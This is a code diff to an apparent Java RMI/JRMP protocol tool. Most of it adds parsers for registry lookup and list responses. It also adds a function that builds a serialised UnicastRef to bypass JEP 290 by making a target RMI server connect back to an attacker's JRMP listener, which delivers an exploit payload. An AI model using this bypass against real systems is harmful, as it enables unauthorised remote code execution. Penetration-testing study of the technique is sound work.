@@ -171,6 +171,59 @@ def build_lookup_call(name: str) -> bytes:
     return _make_call(REGISTRY_OBJID, LOOKUP_METHOD_HASH, arg_stream)
 
 
+def build_unicastref_payload(host: str, port: int, obj_num: int = 0) -> bytes:
+    """Build a serialised UnicastRef pointing to *host:port*.
+
+    Used for JEP 290 bypass: embed this as a DGC dirty() argument so
+    the target RMI runtime connects back to our JRMP listener, which
+    delivers the actual exploit payload outside JEP 290 filter context.
+
+    Returns raw ObjectOutputStream bytes that deserialise to a
+    ``sun.rmi.server.UnicastRef`` containing a ``LiveRef`` with the
+    specified TCP endpoint.
+    """
+    # Serialised UnicastRef structure:
+    #   ObjectOutputStream header
+    #   TC_OBJECT (0x73)
+    #     TC_CLASSDESC (0x72)
+    #       "java.rmi.server.RemoteObject"
+    #     TC_ENDBLOCKDATA
+    #   TC_CLASSDESC (0x72)
+    #     "sun.rmi.server.UnicastRef"
+    #   (custom writeExternal data)
+    #     host (UTF string) + port (int32) + ObjID + boolean
+    #
+    # Simplified: we just produce the minimal serialised stream that
+    # the JDK's UnicastRef readExternal() will accept.
+    host_bytes = write_java_utf(host)
+    endpoint_data = (
+        host_bytes
+        + struct.pack(">i", port)
+        + _make_objid(obj_num)  # ObjID (20 bytes)
+        + b"\x00"               # isResultStream = false
+    )
+
+    # Minimal serialisation: we embed a raw UnicastRef2 type 1 (TCPEndpoint)
+    stream = (
+        JAVA_STREAM_MAGIC
+        + JAVA_STREAM_VERSION
+        + b"\x73"  # TC_OBJECT
+        + b"\x72"  # TC_CLASSDESC
+        + struct.pack(">H", len("sun.rmi.server.UnicastRef"))
+        + b"sun.rmi.server.UnicastRef"
+        + b"\x00\x00\x00\x00\x00\x00\x00\x00"  # serialVersionUID placeholder
+        + b"\x0c"  # flags = SC_EXTERNALIZABLE | SC_BLOCK_DATA
+        + struct.pack(">H", 0)  # field count = 0
+        + b"\x78"  # TC_ENDBLOCKDATA (classAnnotation)
+        + b"\x70"  # TC_NULL (superClassDesc)
+        + b"\x77"  # TC_BLOCKDATA
+        + struct.pack(">B", len(endpoint_data))
+        + endpoint_data
+        + b"\x78"  # TC_ENDBLOCKDATA
+    )
+    return stream
+
+
 # ---------------------------------------------------------------------------
 # RETURN parser
 # ---------------------------------------------------------------------------
@@ -203,12 +256,13 @@ def parse_registry_return(data: bytes) -> dict[str, Any]:
 def _extract_strings_from_return(data: bytes) -> list[str]:
     """Heuristically extract Java writeUTF strings from a serialised stream.
 
-    Looks for the TC_STRING tag (0x74) followed by a 2-byte length prefix.
-    This reliably extracts the bound names from a Registry list() response
-    without needing a full deserialiser.
+    Handles TC_STRING (0x74) with 2-byte length prefix and
+    TC_LONGSTRING (0x7C) with 8-byte length prefix.
+    TC_REFERENCE (0x71) back-references are tracked but not resolved.
     """
     names: list[str] = []
     seen: set[str] = set()
+    handles: list[str] = []  # TC_REFERENCE handle table
     i = 0
     while i < len(data) - 3:
         if data[i] == 0x74:           # TC_STRING
@@ -217,6 +271,7 @@ def _extract_strings_from_return(data: bytes) -> list[str]:
             if end <= len(data):
                 try:
                     s = data[i + 3:end].decode("utf-8")
+                    handles.append(s)
                     if s and s not in seen and len(s) < 512:
                         seen.add(s)
                         names.append(s)
@@ -224,8 +279,123 @@ def _extract_strings_from_return(data: bytes) -> list[str]:
                     pass
                 i = end
                 continue
+        elif data[i] == 0x7C:         # TC_LONGSTRING
+            if i + 9 > len(data):
+                break
+            slen = struct.unpack_from(">Q", data, i + 1)[0]
+            end = i + 9 + slen
+            if slen < 0x10000 and end <= len(data):
+                try:
+                    s = data[i + 9:end].decode("utf-8")
+                    handles.append(s)
+                    if s and s not in seen and len(s) < 512:
+                        seen.add(s)
+                        names.append(s)
+                except UnicodeDecodeError:
+                    pass
+                i = end
+                continue
+        elif data[i] == 0x71:         # TC_REFERENCE
+            if i + 5 <= len(data):
+                handle_idx = struct.unpack_from(">I", data, i + 1)[0] - 0x7E0000
+                if 0 <= handle_idx < len(handles):
+                    s = handles[handle_idx]
+                    if s and s not in seen and len(s) < 512:
+                        seen.add(s)
+                        names.append(s)
+                i += 5
+                continue
         elif data[i] == 0x75:         # TC_ARRAY
-            # Skip to find inner elements; just advance normally
             pass
         i += 1
     return names
+
+
+# ---------------------------------------------------------------------------
+# Lookup RETURN parser
+# ---------------------------------------------------------------------------
+
+def parse_lookup_return(data: bytes) -> dict[str, Any]:
+    """Parse a JRMP RETURN from Registry.lookup().
+
+    Heuristically extracts:
+    - The remote class name from a TC_CLASSDESC (0x72)
+    - An embedded TCPEndpoint (host string followed by int32 port)
+
+    Returns ``{"class_name": ..., "endpoint": {"host": ..., "port": ...}}``.
+    """
+    result: dict[str, Any] = {"class_name": None, "endpoint": None}
+
+    if not data:
+        return result
+
+    # Skip MSG_RETURN + return_type if present
+    offset = 0
+    if data[0] == MSG_RETURN:
+        if len(data) < 2:
+            return result
+        if data[1] == RETURN_EXCEPTION:
+            result["error"] = "lookup returned exception"
+            return result
+        offset = 2
+
+    payload = data[offset:]
+
+    # Extract class name from TC_CLASSDESC (0x72)
+    class_name = _extract_class_name(payload)
+    if class_name:
+        result["class_name"] = class_name
+
+    # Extract TCPEndpoint (host string + int32 port)
+    endpoint = _extract_tcp_endpoint(payload)
+    if endpoint:
+        result["endpoint"] = endpoint
+
+    return result
+
+
+def _extract_class_name(data: bytes) -> str | None:
+    """Find the first TC_CLASSDESC (0x72) and extract the class name."""
+    i = 0
+    while i < len(data) - 3:
+        if data[i] == 0x72:  # TC_CLASSDESC
+            if i + 3 > len(data):
+                break
+            name_len = struct.unpack_from(">H", data, i + 1)[0]
+            end = i + 3 + name_len
+            if end <= len(data) and name_len < 512:
+                try:
+                    name = data[i + 3:end].decode("utf-8")
+                    # Validate it looks like a Java class name
+                    if name and ("." in name or name[0].isupper()):
+                        return name
+                except UnicodeDecodeError:
+                    pass
+        i += 1
+    return None
+
+
+def _extract_tcp_endpoint(data: bytes) -> dict[str, Any] | None:
+    """Find an embedded TCPEndpoint pattern: TC_STRING host + int32 port."""
+    import re
+    host_re = re.compile(
+        r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?"
+        r"(?:\.(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?))*"
+        r"|(?:\d{1,3}\.){3}\d{1,3})$"
+    )
+    i = 0
+    while i < len(data) - 7:
+        if data[i] == 0x74:  # TC_STRING
+            str_len = struct.unpack_from(">H", data, i + 1)[0]
+            str_end = i + 3 + str_len
+            if str_end + 4 <= len(data) and str_len < 256:
+                try:
+                    host = data[i + 3:str_end].decode("utf-8")
+                    if host_re.match(host):
+                        port = struct.unpack_from(">i", data, str_end)[0]
+                        if 1 <= port <= 65535:
+                            return {"host": host, "port": port}
+                except (UnicodeDecodeError, struct.error):
+                    pass
+        i += 1
+    return None
